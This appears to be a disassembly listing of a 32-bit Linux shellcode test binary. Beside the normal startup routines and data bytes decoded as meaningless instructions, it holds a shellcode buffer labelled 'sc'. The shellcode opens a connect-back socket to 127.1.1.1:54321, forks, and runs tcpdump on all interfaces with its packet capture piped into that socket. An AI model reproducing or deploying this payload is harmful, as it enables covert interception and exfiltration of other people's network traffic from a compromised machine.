das
insb   (%dx),%es:(%edi)
imul   $0x6c2d646c,0x2f(%edx),%esp
imul   $0x6f732e78,0x75(%esi),%ebp
xor    %cs:(%eax),%al
add    $0x0,%al
add    %al,(%eax)
adc    %al,(%eax)
add    %al,(%eax)
add    %eax,(%eax)
add    %al,(%eax)
inc    %edi
dec    %esi
push   %ebp
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%edx)
add    %al,(%eax)
add    %al,(%esi)
add    %al,(%eax)
add    %bl,(%eax)
add    %al,(%eax)
add    $0x0,%al
add    %al,(%eax)
adc    $0x0,%al
add    %al,(%eax)
add    (%eax),%eax
add    %al,(%eax)
inc    %edi
dec    %esi
push   %ebp
add    %bl,(%eax,%eax,4)
arpl   %bp,%dx
jecxz  8048132 <_init-0x162>
lds    (%ecx),%edi
jnp    80481ba <_init-0xda>
fbstp  0xcba1bb4(%esi)
mov    (%edx),%?
.byte 0x20
.byte 0x7c
add    (%eax),%al
add    %al,(%eax)
add    (%eax),%eax
add    %al,(%eax)
add    %eax,(%eax)
add    %al,(%eax)
add    $0x0,%eax
and    %al,(%eax)
and    %al,(%eax)
add    %al,(%eax)
add    %al,(%ebx)
add    %al,(%eax)
.byte 0x0
lods   %ds:(%esi),%eax
dec    %ebx
jecxz  804818c <_init-0x108>
sub    $0x0,%al
add    %al,(%eax)
and    %al,(%eax)
add    %al,(%eax)
sbb    (%eax),%al
add    %al,(%eax)
adc    (%eax),%al
add    %al,(%eax)
or     (%eax),%eax
add    %al,(%eax)
mov    %es,0x408(%esp,%eax,1)
add    %dl,(%ecx)
add    %cl,(%edi)
add    %ch,0x62(%ecx,%ebp,2)
arpl   %bp,(%esi)
jae    8048283 <_init-0x11>
cs add %bl,%cs:%ss:0x49(%edi)
dec    %edi
pop    %edi
jae    8048291 <_init-0x3>
imul   $0x64657375,%fs:0x5f(%esi),%ebp
add    %bl,0x5f(%edi)
insb   (%dx),%es:(%edi)
imul   $0x6174735f,0x63(%edx),%esp
jb     80482a6 <_init+0x12>
pop    %edi
insl   (%dx),%es:(%edi)
popa
imul   $0x6d675f5f,0x0(%esi),%ebp
outsl  %ds:(%esi),(%dx)
outsb  %ds:(%esi),(%dx)
pop    %edi
jae    80482b5 <_init+0x21>
popa
jb     80482b8 <_init+0x24>
pop    %edi
pop    %edi
add    %al,0x4c(%edi)
dec    %ecx
inc    %edx
inc    %ebx
pop    %edi
xor    (%esi),%ch
xor    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    (%eax),%al
add    %eax,(%eax)
add    %eax,(%eax)
add    %eax,(%eax)
add    %eax,(%eax)
add    %al,(%eax)
adc    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
adc    %ch,0x69(%ecx)
or     $0x20000,%eax
cmp    (%eax),%eax
add    %al,(%eax)
add    %al,(%eax)
cld
lahf
add    $0x8,%al
push   %es
add    %eax,(%eax)
or     $0xa0,%al
add    $0x8,%al
pop    %es
add    %eax,(%eax)
add    %dl,(%eax)
mov    0x2070804,%al
push   %ebx
sub    $0x8,%esp
call   8048320 <__x86.get_pc_thunk.bx>
add    $0x1d63,%ebx
mov    -0x4(%ebx),%eax
test   %eax,%eax
je     80482b2 <_init+0x1e>
call   80482d0 <__gmon_start__@plt>
add    $0x8,%esp
pop    %ebx
ret
pushl  0x804a004
jmp    *0x804a008
add    %al,(%eax)
jmp    *0x804a00c
push   $0x0
jmp    80482c0 <_init+0x2c>
jmp    *0x804a010
push   $0x8
jmp    80482c0 <_init+0x2c>
xor    %ebp,%ebp
pop    %esi
mov    %esp,%ecx
and    $0xfffffff0,%esp
push   %eax
push   %esp
push   %edx
push   $0x8048470
push   $0x8048400
push   %ecx
push   %esi
push   $0x80483ed
call   80482e0 <__libc_start_main@plt>
hlt
xchg   %ax,%ax
xchg   %ax,%ax
xchg   %ax,%ax
xchg   %ax,%ax
xchg   %ax,%ax
xchg   %ax,%ax
xchg   %ax,%ax
mov    (%esp),%ebx
ret
xchg   %ax,%ax
xchg   %ax,%ax
xchg   %ax,%ax
xchg   %ax,%ax
xchg   %ax,%ax
xchg   %ax,%ax
mov    $0x804a0db,%eax
sub    $0x804a0d8,%eax
cmp    $0x6,%eax
ja     8048340 <deregister_tm_clones+0x10>
ret
mov    $0x0,%eax
test   %eax,%eax
je     804833f <deregister_tm_clones+0xf>
push   %ebp
mov    %esp,%ebp
sub    $0x18,%esp
movl   $0x804a0d8,(%esp)
call   *%eax
leave
ret
lea    0x0(%esi),%esi
mov    $0x804a0d8,%eax
sub    $0x804a0d8,%eax
sar    $0x2,%eax
mov    %eax,%edx
shr    $0x1f,%edx
add    %edx,%eax
sar    %eax
jne    8048379 <register_tm_clones+0x19>
ret
mov    $0x0,%edx
test   %edx,%edx
je     8048378 <register_tm_clones+0x18>
push   %ebp
mov    %esp,%ebp
sub    $0x18,%esp
mov    %eax,0x4(%esp)
movl   $0x804a0d8,(%esp)
call   *%edx
leave
ret
mov    %esi,%esi
lea    0x0(%edi,%eiz,1),%edi
cmpb   $0x0,0x804a0d8
jne    80483bc <__do_global_dtors_aux+0x1c>
push   %ebp
mov    %esp,%ebp
sub    $0x8,%esp
call   8048330 <deregister_tm_clones>
movb   $0x1,0x804a0d8
leave
repz ret
xchg   %ax,%ax
mov    0x8049f10,%eax
test   %eax,%eax
je     80483e8 <frame_dummy+0x28>
mov    $0x0,%eax
test   %eax,%eax
je     80483e8 <frame_dummy+0x28>
push   %ebp
mov    %esp,%ebp
sub    $0x18,%esp
movl   $0x8049f10,(%esp)
call   *%eax
leave
jmp    8048360 <register_tm_clones>
nop
jmp    8048360 <register_tm_clones>
push   %ebp
mov    %esp,%ebp
and    $0xfffffff0,%esp
mov    $0x804a040,%eax
call   *%eax
leave
ret
xchg   %ax,%ax
xchg   %ax,%ax
push   %ebp
push   %edi
xor    %edi,%edi
push   %esi
push   %ebx
call   8048320 <__x86.get_pc_thunk.bx>
add    $0x1bf5,%ebx
sub    $0x1c,%esp
mov    0x30(%esp),%ebp
lea    -0xf4(%ebx),%esi
call   8048294 <_init>
lea    -0xf8(%ebx),%eax
sub    %eax,%esi
sar    $0x2,%esi
test   %esi,%esi
je     8048459 <__libc_csu_init+0x59>
lea    0x0(%esi),%esi
mov    0x38(%esp),%eax
mov    %ebp,(%esp)
mov    %eax,0x8(%esp)
mov    0x34(%esp),%eax
mov    %eax,0x4(%esp)
call   *-0xf8(%ebx,%edi,4)
add    $0x1,%edi
cmp    %esi,%edi
jne    8048438 <__libc_csu_init+0x38>
add    $0x1c,%esp
pop    %ebx
pop    %esi
pop    %edi
pop    %ebp
ret
jmp    8048470 <__libc_csu_fini>
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
repz ret
push   %ebx
sub    $0x8,%esp
call   8048320 <__x86.get_pc_thunk.bx>
add    $0x1b83,%ebx
add    $0x8,%esp
pop    %ebx
ret
add    (%eax),%eax
add    %eax,(%eax)
add    (%eax),%al
add    %ebx,(%ebx)
add    (%ebx),%edi
sub    %al,(%eax)
add    %al,(%eax)
add    $0x0,%al
add    %al,(%eax)
xor    %bh,%dh
(bad)
incl   0x0(%eax,%eax,1)
add    %bl,-0x1(%ebp)
(bad)
ljmp   *0x0(%eax)
add    %al,(%eax)
jo     80484ad <_IO_stdin_used+0x21>
(bad)
decl   -0x20000000(%eax)
(bad)
(bad)
inc    %esp
add    %al,(%eax)
adc    $0x0,%al
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %edi,0x52(%edx)
add    %al,(%ecx)
jl     80484d3 <_IO_stdin_used+0x47>
add    %ebx,(%ebx)
or     $0x4,%al
add    $0x88,%al
add    %eax,(%eax)
add    %ah,(%eax)
add    %al,(%eax)
add    %bl,(%eax,%eax,1)
add    %al,(%eax)
in     $0xfd,%al
(bad)
pushl  (%eax)
add    %al,(%eax)
add    %al,(%eax)
push   %cs
or     %al,0xe(%esi)
or     $0x4a,%al
ud2
je     80484f3 <_IO_stdin_used+0x67>
js     80484f1 <_IO_stdin_used+0x65>
aas
sbb    (%ebx),%bh
sub    (%edx),%dh
and    $0x22,%al
sbb    $0x0,%al
add    %al,(%eax)
inc    %eax
add    %al,(%eax)
add    %ch,%ch
(bad)
(bad)
decl   (%edi)
add    %al,(%eax)
add    %al,(%eax)
inc    %ecx
push   %cs
or     %al,0x50d4202(%ebp)
dec    %ebx
lds    (%esp,%eax,1),%ecx
add    $0x0,%al
add    %bh,(%eax)
add    %al,(%eax)
add    %ah,0x0(%eax)
add    %al,(%eax)
loopne 8048520 <_IO_stdin_used+0x94>
(bad)
jmp    *0x0(%ecx)
add    %al,(%eax)
add    %al,0xe(%ecx)
or     %al,0xc0e4102(%ebp)
xchg   %eax,(%ebx)
inc    %ebx
push   %cs
adc    %al,0x140e4104(%esi)
addl   $0x48,0x2300e4e
push   %cs
adc    $0x41,%al
ret
push   %cs
adc    %al,-0x3a(%ecx)
push   %cs
or     $0x41,%al
(bad)
push   %cs
or     %al,-0x3b(%ecx)
push   %cs
add    $0x10,%al
add    %al,(%eax)
add    %bl,-0xec0000(%eax,%eax,1)
(bad)
incl   (%edx)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
.byte 0xc0
.byte 0x83
add    $0x8,%al
.byte 0xa0
.byte 0x83
add    $0x8,%al
add    %al,(%eax)
add    %eax,(%eax)
add    %al,(%eax)
add    %eax,(%eax)
add    %al,(%eax)
or     $0x0,%al
add    %al,(%eax)
xchg   %eax,%esp
(bad)
add    $0x8,%al
or     $0x74000000,%eax
test   %al,(%eax,%ecx,1)
sbb    %eax,(%eax)
add    %al,(%eax)
or     %bl,0x1b0804(%edi)
add    %al,(%eax)
add    $0x0,%al
add    %al,(%eax)
sbb    (%eax),%al
add    %al,(%eax)
or     $0x9f,%al
add    $0x8,%al
sbb    $0x0,%al
add    %al,(%eax)
add    $0x0,%al
add    %al,(%eax)
cmc
(bad)
ljmp   *-0x54(%edi)
addl   $0x5,(%eax,%ecx,1)
or     $0x82,%al
add    $0x8,%al
push   %es
add    %al,(%eax)
add    %cl,%ah
addl   $0xa,(%eax,%ecx,1)
inc    %ebp
add    %al,(%eax)
add    %cl,(%ebx)
add    %al,(%eax)
add    %dl,(%eax)
add    %al,(%eax)
add    %dl,0x0
add    %al,(%eax)
add    %al,(%ebx)
add    %al,(%eax)
add    %al,(%eax)
mov    0x20804,%al
add    %al,(%eax)
adc    %al,(%eax)
add    %al,(%eax)
adc    $0x0,%al
add    %al,(%eax)
adc    %eax,(%eax)
add    %al,(%eax)
pop    %ss
add    %al,(%eax)
add    %al,0x110804(%edx,%eax,4)
add    %al,(%eax)
jl     8049f24 <_DYNAMIC+0x10>
add    $0x8,%al
adc    (%eax),%al
add    %al,(%eax)
or     %al,(%eax)
add    %al,(%eax)
adc    (%eax),%eax
add    %al,(%eax)
or     %al,(%eax)
add    %al,(%eax)
(bad)
(bad)
ljmp   *0x5c(%edi)
(bad)
add    $0x8,%al
(bad)
(bad)
ljmp   *0x1(%edi)
add    %al,(%eax)
add    %dh,%al
(bad)
ljmp   *0x52(%edi)
(bad)
add    $0x8,%al
add    %al,(%eax)
adc    $0x9f,%al
add    $0x8,%al
(bad)
(bad)
add    $0x8,%al
out    %al,$0x82
add    $0x8,%al
add    %al,(%eax)
push   $0x66
pop    %eax
push   $0x1
pop    %ebx
xor    %ecx,%ecx
push   %ecx
push   $0x2
push   $0x2
mov    %esp,%ecx
int    $0x80
push   $0x101017f
pushw  $0x31d4
xor    %cx,%cx
add    $0x2,%cl
push   %cx
mov    %esp,%ecx
push   $0x10
push   %ecx
push   %eax
mov    %esp,%ecx
mov    %eax,%esi
mov    $0x66,%al
add    $0x2,%bl
int    $0x80
xchg   %ebx,%esi
push   $0x1
pop    %ecx
push   $0x3f
pop    %eax
int    $0x80
xor    %edx,%edx
push   $0x2
pop    %eax
int    $0x80
cmp    %edx,%eax
je     804a08d <sc+0x4d>
push   $0x1
pop    %eax
int    $0x80
push   $0xb
pop    %eax
push   %edx
push   $0x31323334
push   $0x35202120
push   $0x74726f70
mov    %esp,%edi
push   %edx
push   $0x2d
pushw  $0x772d
mov    %esp,%esi
push   %edx
push   $0x79
push   $0x6e61692d
mov    %esp,%ecx
push   %edx
push   $0x70
push   $0x6d756470
push   $0x63742f6e
push   $0x6962732f
push   $0x7273752f
mov    %esp,%ebx
push   %edx
push   %edi
push   %esi
push   %ecx
push   %ebx
mov    %esp,%ecx
int    $0x80
add    %al,(%eax)
inc    %edi
inc    %ebx
inc    %ebx
cmp    (%eax),%ah
sub    %dl,0x62(%ebp)
jne    78 <_init-0x804821c>
je     81 <_init-0x8048213>
and    %dh,(%esi,%ebp,1)
cmp    %ch,(%esi)
xor    $0x2d,%al
xor    0x62(%ebp),%dh
jne    86 <_init-0x804820e>
je     8f <_init-0x8048205>
xor    %edi,0x31(%esi)
xor    $0x2e,%al
xor    %dh,(%ecx,%ebp,1)
and    %dh,(%esi,%ebp,1)
cmp    %ch,(%esi)
xor    $0x0,%al
inc    %edi
inc    %ebx
inc    %ebx
cmp    (%eax),%ah
sub    %dl,0x62(%ebp)
jne    a1 <_init-0x80481f3>
je     aa <_init-0x80481ea>
and    %dh,(%esi,%ebp,1)
cmp    %ch,(%esi)
xor    0x62753931,%ch
jne    b0 <_init-0x80481e4>
je     b9 <_init-0x80481db>
xor    %ebp,(%ecx)
and    %dh,(%esi,%ebp,1)
cmp    %ch,(%esi)
xor    (%eax),%al
